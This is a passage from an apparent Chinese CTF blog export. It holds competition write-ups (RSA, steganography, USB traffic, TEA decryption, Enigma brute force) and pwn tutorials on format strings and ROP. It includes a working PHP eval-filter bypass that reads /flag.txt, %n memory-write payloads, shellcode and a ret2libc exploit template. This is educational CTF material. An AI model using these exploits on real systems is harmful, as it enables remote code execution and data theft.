$N=pq,p-1=2ga,q-1=2gb,h=2gab+a+b$，有 $N-1=2gh$， 所以 $x^{N-1} \\pmod p$ 至多有 $a$ 个值，用 $x \\rightarrow x^{N-1}+3$ 代替 Pollard’s rho算法中迭代函数，能在 $\\text{O}(\\sqrt{a})=\\text{O}(N^{\\frac{1}{4}-\\frac{\\gamma}{2}})$ 下分解 $N$。 common prime RSA在 $g$ 过小时， $g$ 也能轻易通过分解 $N-1$ 来解出。 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *import gmpy2def f(x, n): return (pow(x, n - 1, n) + 3) % ndef rho(n): i = 1 while True: a = getRandomRange(2, n) b = f(a, n) j = 1 while True: p = GCD(abs(a - b), n) print(&#x27;&#123;&#125; in &#123;&#125; circle&#x27;.format(j, i)) if p == n: break elif p &gt; 1: return (p, n // p) else: a = f(a, n) b = f(f(b, n), n) j += 1 i += 1n = 84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039e = 58337c = 13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668p, q = rho(n)d = gmpy2.invert(e, (p-1)*(q-1))m = pow(c, d, n)print(bytes.fromhex(hex(m)[2:]))#b&#x27;SangFor&#123;0a8c2220-4c1b-32c8-e8c1-adf92ec7678b&#125;&#x27; ​ Bigrsa BigRSA！ 123456789101112131415from Crypto.Util.number import *from flag import *n1 = 103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061n2 = 115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073e = 65537m = bytes_to_long(flag)c = pow(m, e, n1)c = pow(c, e, n2)print(&quot;c = %d&quot; % c)# output# c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264 尝试发现 $\\gcd(n_1,n_2)=p$，分别求出 $q_1=n_1/p,q_2=n_2/p$，再用常规解密方法两步求出 $m$： 123456789101112131415import gmpy2n1 = 103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061n2 = 115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073e = 65537c = 60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264p = gmpy2.gcd(n1,n2)q1 = n1 // pq2 = n2 // pd1 = gmpy2.invert(e, (p-1)*(q1-1))d2 = gmpy2.invert(e, (p-1)*(q2-1))c = pow(c, d2, n2)m = pow(c, d1, n1)print(bytes.fromhex(hex(m)[2:]))#b&#x27;SangFor&#123;qSccmm1WrgvIg2Uq_cZhmqNfEGTz2GV8&#125;&#x27; ​ Misc签到题 简简单单猜数字01-30 SangFor{md5(---…..)}（32位md5） 12张图分别得到关键数字：28-08-30-07-04-20-02-17-23-01-12-19，md5得flag：SangFor{d93b7da38d89c19f481e710ef1b3558b} ​ Misc520 有一天，zip爱上了pcap，zip为了能与pcap创造更多机会，不断地将自己的能力表现出来。可是，LSBSteg却突然杀了出来，将pcap吞并于png中，不放出来。zip看到了png，多喝热水少做梦。zip异常的愤怒，不断地用自己的能力去报复png，不让png逃走。至今，zip仍未释怀。。。 拿到520.zip压缩包，循环嵌套着520层zip和story文件，脚本解压出所有文件（每次解压将story文件重命名防覆盖）： 12345678910111213141516171819202122import zipfile import osnow = &quot;520.zip&quot;while 1: print(&quot;~~&quot;+now) zfile = zipfile.ZipFile(now) zfile.extractall(members=zfile.namelist()) zfile.close() try: os.remove(now) except OSError as e: print(e) names = os.listdir() os.rename(&#x27;story&#x27;,&#x27;story&#x27;+now.split(&#x27;.&#x27;)[0]) print(names) for name in names: if name.endswith(&#x27;.zip&#x27;) and name != now: now=name break print(&#x27;~~~~&#x27;+now) 解出最里层是一张flag.png图片，按大小排序目录下所有文件，发现story150内容与其他不同： 123456这都被你发现了？我这故事不错吧，嘻嘻嘻那就把flag给你吧oh，不，还有一半藏在了pcap的心里，快去找找吧左心房右心房，扑通扑通的心，咿呀咿呀的❤72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108, 得到数字 72, 89, 75, 88, 128, 93, 58, 116, 76, 121, 120, 63, 108, 根据提示，zsteg查看png图片存在lsb隐写，按bgr方式提取出一个zip加密压缩包，爆破得密码12345解出flag.pcap。 wireshark查看发现全为USB流量，tshark提取： tshark -r flag.pcap -T fields -e usb.capdata | sed &#39;/^\\s*$/d&#39; &gt; usbdata.txt 将鼠标数据还原鼠标移动轨迹： 12345678910111213141516171819202122232425262728293031323334353637383940f=open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)fi=open(&#x27;out.txt&#x27;,&#x27;w&#x27;)while 1: a=f.readline().strip() if a: if len(a)==8: out=&#x27;&#x27; for i in range(0,len(a),2): if i+2 != len(a): out+=a[i]+a[i+1]+&quot;:&quot; else: out+=a[i]+a[i+1] fi.write(out) fi.write(&#x27;\\n&#x27;) else: breakfi.close()nums = []keys = open(&#x27;out.txt&#x27;,&#x27;r&#x27;)f = open(&#x27;xy.txt&#x27;,&#x27;w&#x27;)posx = 0posy = 0for line in keys: if len(line) != 12 : continue x = int(line[3:5],16) y = int(line[6:8],16) if x &gt; 127 : x -= 256 if y &gt; 127 : y -= 256 posx += x posy += y btn_flag = int(line[0:2],16) # 1 for left , 2 for right , 0 for nothing f.write(str(posx)) f.write(&#x27; &#x27;) f.write(str(posy)) f.write(&#x27;\\n&#x27;)f.close() 最后gnuplot做图： gnuplot&gt; plot &quot;xy.txt&quot; 得到后半部分数字：130, 63, 111, 94, 51, 134, 119, 146 结合flag格式，推知为变异凯撒移位解密，解出： [71, 87, 72, 84, 123, 87, 51, 108, 67, 111, 109, 51, 95, 116, 48, 95, 77, 33, 115, 99, 125] 即GWHT&#123;W3lCom3_t0_M!sc&#125;，按群提示换为Sangfor&#123;W3lCom3_t0_M!sc&#125;。 ​","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"CTFshow 吃瓜杯","slug":"match-CTFshow-吃瓜杯","date":"2021-08-16T11:22:00.000Z","updated":"2021-08-16T12:32:10.014Z","comments":true,"path":"2021/08/16/match-CTFshow-吃瓜杯/","link":"","permalink":"https://lazzzaro.github.io/2021/08/16/match-CTFshow-%E5%90%83%E7%93%9C%E6%9D%AF/","excerpt":"","text":"​ 比赛名称：ctfshow 吃瓜杯题目范围：web pwn re misc crypto题目难度：怎么简单怎么来比赛奖励：ctfshow定制鼠标垫或萌妹手办比赛时间：2021年8月14日(周六) 晚 7点7分比赛时长：48小时比赛地址：https://ctf.show/challenges MISCMisc游戏签到 运气与策略运气的游戏。值得注意的是，第一局出现必输的情况是正常的，并且概率较低，这能表明您在七夕这个节日真的非常欧，这边建议去抽卡。所以说本题没有策略，只有运气。 地址： 移步去备用题,flag就在这交 运气游戏，写个循环脚本跑出分段flag。 ​ Dinner of Cyanogen给了两个docx，一个未加密，另一个加密。 在未加密docx得到flag第一段； 发现其中的 [Content_Types].xml 大小相同，上明文攻击： rbkcrack.exe -C AnotherLetter.zip -c &quot;[Content_Types].xml&quot; -p &quot;[Content_Types].xml&quot; 得到3-key，再用7z工具解压： 7za x AnotherLetter.zip &#39;-p[3b982977_2706fd64_6d6a5135]&#39; -oout 在 flag.xml 得到flag第二段； 在 word.xml 分别用0/1代替Wingdings两种字体，转字符串得到flag第三段。 ​ xl的本质Excel 2007（.xlsx）文件本质是压缩包。 新建一个excel，插入绘图，保存退出。 替换其中 xl/drawing 目录下的 drawing.xml 为题目给的xml文件，再打开xlsx文件看到flag图片。 ​ 吃瓜jpg改为zip解压，文件为base64图片，浏览器打开得到二维码，扫码得栅栏密码，枚举栏数（栏数=2）解密得flag。 ​ 魔王 需要自己包上ctfshow{} 题目有很多误导，小心点哦 w3x为魔兽争霸地图文件，直接找到地图查看工具 War3 Model Editor，找到flag字符串。 ​ CRYPTO闪电五连鞭·一鞭 朋友们好。 今天，和大家，探讨一下，怎样打RSA置换闪电鞭。 要做到三点。 一：要做到问题真正的放松。但是线性代数基本知识要用好。这里面，该松的松，该紧的紧。松中有紧，紧中有松。这个问题非常复杂，在这里不多说。在问题的描述中有详细的解释； 二：要练好内功，你才能代码中发力，打出RSA置换劲儿。慢练，这是签到的……快练！下合上开，上合下开！所以，这个RSA置换劲儿啊……这个RSA和置换都在动啊…… 三：要用高维的RSA置换劲儿，才能打出RSA置换闪电鞭。因为这个鞭的劲儿，你看……是不是，你看……都是高维的啊…… 下面我打一个连五鞭啊……打了五鞭：一鞭，两鞭，三鞭，四鞭，五鞭。这五鞭要连次打，你看：实战时间，一定要动武，全身松好，用高维的劲，RSA置换劲儿！才能打出flag，打出RSA置换闪电鞭！ 谢谢朋友们。 1234567import gmpy2n = 8870619487339789349033932217513908953609539651949986489986889710933094577873155191810742828503059670650154455297603719c = 6940158573485767169443582872275118843545217792197971962103010557916847970940437712181778807436191892307187137338300231d = gmpy2.invert(3, euler_phi(n))m = pow(c, d, n)bytes.fromhex(hex(m)[2:]) ​ 闪电五连鞭·二鞭12345678910111213141516171819202122import randomimport gmpy2random.seed(0x36D)n = 3950848271664122675439855009329233027357977239695163232943132810210035583520735079984423511153607529820284200137188647Zn = Zmod(n)P = PermutationGroupElement(&#x27;(1,14,25,8,23,15)(2,22,17)(3,18,13,33,11,30,26,27,10,6,16,31,28,21,29,36,7,9)(4,35,12,32,20,5,24)(19,34)&#x27;)P = Matrix(Zn, P.matrix())A = Matrix(Zn, 36, 36, lambda x, y: random.randint(0, 0x36D))B = A * P * A^-1c = [...]C = []for i in range(36): C.append(c[i*36:(i+1)*36])C = Matrix(Zn, C)B_inv = B^3C_new = C / B_invcc = C_new[0][0]d = gmpy2.invert(3, euler_phi(n))m = pow(cc, d, n)bytes.fromhex(hex(m)[2:]) ​ 闪电五连鞭·三鞭123456789101112# BB = B^3# BB_inv = BB^(-1)# CC = C * BB_invimport gmpy2n = 25126409997644048715497037905442671105116158875704245711785280791201683049008805107543997350200944348915833337286069203cc = 2440870830361488333405717893137622686904829095539256446436231771058787790530861000815874544642875904753470292396055730cc = (cc * gmpy2.invert(36, n)) % nd = gmpy2.invert(3, euler_phi(n))m = pow(cc, d, n)bytes.fromhex(hex(m)[2:]) ​ 闪电五连鞭·四鞭12345678910111213# BB = B^17# BB_inv = BB^(-1)# CC = C * BB_inv# I.trace() = 88import gmpy2n = 8832564044541326030658929702316436880591014904231676570839678873603730471484972295046612326549001678639811100026511993cc = 5298954238197992022282643920507107154250709069597164746868432885002292554976622438394424965260846005857405245601483810cc = (cc * gmpy2.invert(88, n)) % nd = gmpy2.invert(17, euler_phi(n))m = pow(cc, d, n)bytes.fromhex(hex(m)[2:]) ​ 大鸟转转转 为响应群主“怎么简单怎么来”的号召，特补上一道古典密码。 明文密文都是大写字母。 请解出正确的明文后，把明文转换成小写，并加上格式所包含的花括号。 Engima密码机。 python反序列化： 12345import picklex = pickle.load(open(&#x27;nimage.pickle&#x27;, &#x27;rb&#x27;))print(x)#&#123;&#x27;UMKEHRWALZE&#x27;: &#x27;B&#x27;, &#x27;WALZENLAGE&#x27;: &#x27;123&#x27;, &#x27;GRUNDSTELLUNG&#x27;: &#x27;WYF&#x27;, &#x27;RINGSTELLUNG&#x27;: &#x27;???&#x27;, &#x27;STECKERVERBINDUNGEN&#x27;: [&#x27;WO&#x27;, &#x27;DE&#x27;, &#x27;JB&#x27;, &#x27;HN&#x27;, &#x27;XI&#x27;], &#x27;KLARTEXT&#x27;: &#x27;CTFSHOW?????????????????????????????&#x27;, &#x27;GEHEIMTEXT&#x27;: &#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;&#125; 尝试用全脚本解密得到的结果有问题，再用pycipher工具解密： 12345678910111213from pycipher import Enigmaimport stringdic = string.ascii_uppercasefor x in dic: for y in dic: for z in dic: eng = Enigma(settings=(&#x27;W&#x27;,&#x27;Y&#x27;,&#x27;F&#x27;),rotors=(1,2,3),reflector=&#x27;B&#x27;, ringstellung=(x,y,z),steckers=[(&#x27;W&#x27;,&#x27;O&#x27;),(&#x27;D&#x27;,&#x27;E&#x27;), (&#x27;J&#x27;,&#x27;B&#x27;),(&#x27;H&#x27;,&#x27;N&#x27;),(&#x27;X&#x27;,&#x27;I&#x27;)]) flag = eng.decipher(&#x27;MXKXBTIOOZHFTGGTTPTRNXJUGASUTVBNSNGS&#x27;) if flag.startswith(&#x27;CTFSHOW&#x27;): print((x,y,z),flag.lower()) ​ REVERSETea_tube_pot 三点几嚟，饮茶先啦！（给大佬递茶.jpg） flag分三部分。 第一部分 TEA加密： 1234567891011121314151617181920212223242526def decrypt(v, k): v0 = v[0] v1 = v[1] x = 0x9E3779B9 * 32 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: encrypted = [0x5FD744F6,0x95832046] key = [0x73696854, 0x5F73695F, 0x74616574, 0x21656275] decrypted = decrypt(encrypted, key) print(bytes.fromhex(hex(decrypted[1])[2:]+hex(decrypted[0])[2:])[::-1])# ENCrT1ny 第二部分 XTEA加密： 1234567891011121314151617181920212223def decrypt(rounds, v, k): v0 = v[0] v1 = v[1] delta = 0x9E3779B9 x = delta * rounds for i in range(rounds): v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: encrypted = [0xFD731313, 0x6662CB90] key = [0x73696854, 0x5F73695F, 0x74616574, 0x21656275] rounds = 32 decrypted = decrypt(rounds, encrypted, key) print(bytes.fromhex(hex(decrypted[1])[2:]+hex(decrypted[0])[2:])[::-1]) # yPti0nA1 第三部分 XXTEA加密： 123456789101112131415161718192021222324252627def shift(z, y, x, k, p, e): return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = (rounds * delta) &amp; 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[0] x = (x - delta) &amp; 0xFFFFFFFF return vif __name__ == &#x27;__main__&#x27;: encrypted = [0x4B136C82, 0x1A6E9613] key = [0x73696854, 0x5F73695F, 0x74616574, 0x21656275] decrypted = decrypt(encrypted, key) print(bytes.fromhex(hex(decrypted[1])[2:]+hex(decrypted[0])[2:])[::-1]) # 9ori7hM! ​ PWNwuqianROP x64签到。然后签退。 ​ WEB热身 最简单的签到 123456789101112131415161718&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 八进制绕过，前面加个字符：?num=%0a010574。 ​ shellme 还是熟悉的感觉 phpinfo页面直接搜flag，很熟悉。 ​ shellme_Revenge 由于上个题有严重的非预期，我的锅，在此给师傅们道歉了 cookie 看到 hint=looklook，访问 ?looklook=1 得到源码： 123456789101112131415161718192021&lt;?phperror_reporting(0);if ($_GET[&#x27;looklook&#x27;])&#123; highlight_file(__FILE__);&#125;else&#123; setcookie(&quot;hint&quot;, &quot;?looklook&quot;, time()+3600);&#125;if (isset($_POST[&#x27;ctf_show&#x27;])) &#123; $ctfshow = $_POST[&#x27;ctf_show&#x27;]; if (is_string($ctfshow) || strlen($ctfshow) &lt;= 107) &#123; if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot;,$ctfshow))&#123; eval($ctfshow); &#125;else&#123; echo(&quot;fucccc hacker!!&quot;); &#125; &#125;&#125; else &#123; phpinfo();&#125;?&gt; 禁用了很多 RCE 绕过姿势，未禁用 $+_;?()[]&lt;&gt;、字母C 和数字0-3，尝试用截断输出内容，用PHP自增特性生成其他字母： 12345$_=[];?&gt;&lt;?=$_ //真Array$_=([].C);?&gt;&lt;?=$_ //字符串ArrayC$_=([].C)[3];?&gt;&lt;?=$_ //字母a$_=([].C)[3];$_++;?&gt;&lt;?=$_ //字母b...... 根据PHP拼接特性，将需要的关键字拆分成字母，用自增特性生成，按照字母序生成可节省payload长度。 payload生成脚本： 1234567891011121314151617181920212223242526272829303132# payload: xxxxxx?&gt;&lt;?=($_GET[0])($_GET[1]);alpha = list(set(need))alpha.sort()print(alpha)greece = &#x27;α β γ δ ε ζ ν ξ ο π ρ σ η θ ι κ λ μ τ υ φ χ ψ ω Γ Δ&#x27;.split(&#x27; &#x27;)out = &#x27;$_=C;&#x27;cnt = ord(&#x27;C&#x27;)for k in alpha: if ord(k)-ord(&#x27;C&#x27;) in range(26): now_php = &#x27;&#x27; for i in range(ord(k)-cnt): now_php += &#x27;$_++;&#x27; cnt += 1 icon = greece[ord(k)-ord(&#x27;C&#x27;)] now_php += f&#x27;$&#123;icon&#125;=$_;&#x27; out += now_phpfunc = []for k in need: if ord(k)-ord(&#x27;C&#x27;) in range(26): icon = greece[ord(k)-ord(&#x27;C&#x27;)] func += [f&#x27;$&#123;icon&#125;&#x27;] else: func += [k]func = &#x27;.&#x27;.join(func)print(func)payload = f&#x27;&#123;out&#125;?&gt;&lt;?=($&#123;&#123;_.&#123;func&#125;&#125;&#125;[0])($&#123;&#123;_.&#123;func&#125;&#125;&#125;[1]);&#x27;print(payload) POST： 12ctf_show = $_=([].C)[3];$α=$_;$_++;$_++;$_++;$_++;$ε=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$σ=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$χ=$_;$β=$ε.$χ.$α.$σ;$_=C;$_++;$_++;$γ=$_;$_++;$_++;$ε=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$μ=$_;($&#123;_.$ε.$γ.$μ&#125;[0])($&#123;_.$ε.$γ.$μ&#125;[1]); GET: ?looklook=1&amp;0=file_get_contents&amp;1=/flag.txt","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"格式化字符串","slug":"pwn-格式化字符串","date":"2021-08-08T10:23:45.000Z","updated":"2022-08-09T16:20:17.091Z","comments":true,"path":"2021/08/08/pwn-格式化字符串/","link":"","permalink":"https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"​ 格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。 ​ 格式化字符串基本格式：%[parameter][flags][field width][.precision][length]type 参数（parameter） n$：获取格式化字符串中的指定参数 长度（length） hh：输出一个字节 h：输出一个双字节 类型（type） d/i：有符号整数 u：无符号整数 x/X：16进制无符号整数 o：8进制无符号整数 n：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 ​ 利用泄露内存%X$p：泄露栈上第X个位置的值（X为任意正整数） addr%X$p：泄露任意地址的数据（addr为要泄露的地址） ​ 覆盖内存%Yc%X$n：将Y写入栈上第X个位置指针指向的位置（Y为要写入的数据，X为任意正整数） addr%(Y-4)c%X$n：向任意地址写（addr为要写入的地址） 栈地址覆盖例：把c的值从789改写为16。 c_addr 占4个字节，所以额外加上12个字节，最终向 c_addr 指向的空间赋值16： payload = p32(c_addr) + b&#39;%12c&#39; + b&#39;%6$n&#39; 小数覆盖例：把a的值改写为2。 如果还用之前的方式，写入的地址最少要占4位，因此最小只能赋值4，尝试把地址放到后面的位置。 赋值2，要写作aa%X$n, 把2赋值给第X个位置指针指向的位置。这个字符串长度为6，不是4的倍数，所以还要补全两个字符，再加上a的地址。这样最终a是落在了栈上第8个位置： payload = b&#39;aa%8$nbb&#39; + p32(a_addr) 大数覆盖例：把b的值改写为0x12345678。 需要赋值一个很大的数，这时候直接向栈中写入这么多的数据肯定不太方便。利用 hh（单字节） 和 h（双字节） 参数逐字节写入。 以单字节的方式写入，若b的地址是 0x0804c028，逐字节写入后的数据分配应该如下所示： 12340x0804c028 \\x780x0804c029 \\x560x0804c02a \\x340x0804c02b \\x12 因此随着构造payload，字符串长度是逐渐增长的，因此要按照从小到大的顺序填充字节，这里要从高位向地位填充： payload = p32(0x0804c02b) + b&#39;a&#39;*(0x12 - 4) + b&#39;%6$hhn&#39; （当前总长度=24，字符长度0x12） 下面填充次高位。填充后面的时候要注意，因为这是一次发送的payload，因此填充后面的时候，前面的字符串长度也要算上，前面的字符串长度已经有24个字节，因此次高位的地址会写入第25-28个字节，这样对应的就是栈中的第12个位置（24/4 + 6）。 构造次高位的字符串时要注意不能包括 %6$hhn 的长度，因此接下来还要填充的字符串个数是 次高字节需要的总字节数 - 填充上一字节已经构造的字节数 - 次高字节地址位数。次高地址这里后续还有payload要填充，由于要地址对齐，因此添加三个b，使得总长度为4的倍数： payload += p32(0x0804c02a) + b&#39;a&#39;*(0x34 - 0x12 - 4) + b&#39;%12$hhn&#39; + b&#39;bbb&#39; （当前总长度=68） 接下来填充次低位。构造方法和上面类似，不过添加字符的时候要记得把 bbb 这三个对齐字节的长度减去： payload += p32(0x0804c029) + b&#39;a&#39;*(0x56 - 0x34 - 4 - 3) + b&#39;%23$hhn&#39; + b&#39;bb&#39; （当前总长度=108） 最后填充低位： payload += p32(0x0804c028) + b&#39;a&#39;*(0x78- 0x56 - 4 - 2) + b&#39;%33$hhn&#39; pwntools工具123456fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)offset (int): 字符串的偏移，从1开始writes (dict): 注入的地址和值，&#123;target_addr:change_to&#125;numbwritten (int) : 已经由printf函数写入的字节数，默认为0write_size : 逐byte/short/int写入，默认是byte","categories":[{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"}],"tags":[{"name":"格式化字符串","slug":"格式化字符串","permalink":"https://lazzzaro.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"}],"author":"Lazzaro"},{"title":"堆","slug":"pwn-堆","date":"2021-08-08T09:59:44.000Z","updated":"2022-08-08T15:20:56.155Z","comments":true,"path":"2021/08/08/pwn-堆/","link":"","permalink":"https://lazzzaro.github.io/2021/08/08/pwn-%E5%A0%86/","excerpt":"","text":"​ 堆 ​ UAF（预留） ​ bin攻击fastbin attack（预留） ​ unsorted bin attack（预留） ​ largebin attack（预留） ​ tcache attack（预留） ​ off by攻击off by one（预留） ​ off by null（预留） ​ unlink（预留） ​ house of系列house of force（预留） ​ house of spirit（预留） ​ house of einherjar（预留） ​ house of roman（预留） ​ house of orange（预留） ​ house of lore（预留） ​ house of rabbit（预留） ​ house of kiwi（预留） ​ house of banana（预留） ​","categories":[{"name":"pwn","slug":"pwn","permalink":"https://lazzzaro.github.io/categories/pwn/"}],"tags":[{"name":"堆","slug":"堆","permalink":"https://lazzzaro.github.io/tags/%E5%A0%86/"}],"author":"Lazzaro"},{"title":"栈","slug":"pwn-栈","date":"2021-08-08T09:59:35.000Z","updated":"2022-11-28T18:55:53.449Z","comments":true,"path":"2021/08/08/pwn-栈/","link":"","permalink":"https://lazzzaro.github.io/2021/08/08/pwn-%E6%A0%88/","excerpt":"","text":"​ ROPROP（Return-Oriented Programming, 返回导向编程） 通过栈溢出的漏洞，覆盖return address，从而达让直行程序反复横跳的一种技术。 静态生成ROPchain： ROPgadget --binary [file] --ropchain ropper --file [file] --chain execve ​ ret2syscall32位调用约定：系统调用号 $eax，参数：$ebx/$ecx/$edx/$esi/$edi/$ebp，调用 int 0x80。 调用 execve(&quot;/bin/sh&quot;, 0, 0)： 1234567891011# $eax = 0xb = 11ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep eax# $ebx = [&quot;/bin/sh&quot;]ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep ebxROPgadget --binary vuln --string &quot;/bin/sh&quot;# $ecx = 0ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep ecx# $edx = 0ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep edx# int 0x80ROPgadget --binary vuln --only &quot;int&quot; 64位调用约定：系统调用号 $rax，参数：$rdi/$rsi/$rdx/$rcx($r10)/$r8/$r9，调用 syscall。 调用 execve(&quot;/bin/sh&quot;, 0, 0)： 1234567891011# $rax = 0x3b = 59ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep rax# $rdi = [&quot;/bin/sh&quot;]ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep rdiROPgadget --binary vuln --string &quot;/bin/sh&quot;# $rsi = 0ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep rsi# $rdx = 0ROPgadget --binary vuln --only &quot;pop|ret&quot; | grep rdx# syscallROPgadget --binary vuln --only &quot;syscall&quot; ​ ret2shellcodeshellcode数据库： Shellcodes database for study cases 常用shellcode： （预留） shellcode限制可见字符Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t 工具：AE64 12345678910from ae64 import AE64from pwn import *context.arch=&#x27;amd64&#x27;# get bytes format shellcodeshellcode = asm(shellcraft.sh())# get alphanumeric shellcodeenc_shellcode = AE64().encode(shellcode)print(enc_shellcode.decode(&#x27;latin-1&#x27;)) 参考：MRCTF 2020 - shellcode_revenge 更多限制函数 __ctype_b_loc() 如 if ( ((*__ctype_b_loc())][s[i]] &amp; 0x4000) == 0 &amp;&amp; s[i] != 10) &#123;&#125; 见 ctype/ctype.h 源码，作用为将输入的字符根据 ((bit) &lt; 8 ? ((1 &lt;&lt; (bit)) &lt;&lt; 8) : ((1 &lt;&lt; (bit)) &gt;&gt; 8)) 进行处理，然后根据下面表对应的结果进行返回。 参考：2021 天翼杯 - ezshell ​ ret2libclibc数据库： https://libc.blukat.me/ https://libc.rip/ https://libc.nullbyte.cat/ glibc-all-in-one 板子查gadget： ROPgadget --binary [file] --only &quot;pop|ret&quot; | grep &quot;xxx&quot; ropper --file [file] --search &quot;xxx&quot; 给定libc1234567891011121314151617181920212223242526272829# x64from pwn import *r = remote(&#x27;x.x.x.x&#x27;, 22222)# r = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so&#x27;)write_plt = elf.plt.writewrite_got = elf.got.writemain_addr = elf.sym.mainpop_rdi = 0x401233pop_rsi = 0x401231pl = &#x27;a&#x27;*(0x80+8)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(write_got)+p64(0)+p64(write_plt)+p64(main_addr)p.sendline(pl)write_addr = u64(r.recv(6).ljust(8,&#x27;\\x00&#x27;))# 或 write_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))print(hex(write_addr))libc_base = write_addr-libc.sym.writeprint(hex(libc_base))system_addr = libc_base+libc.sym.systembinsh_addr = libc_base+libc.search(&#x27;/bin/sh&#x27;).next()pl = 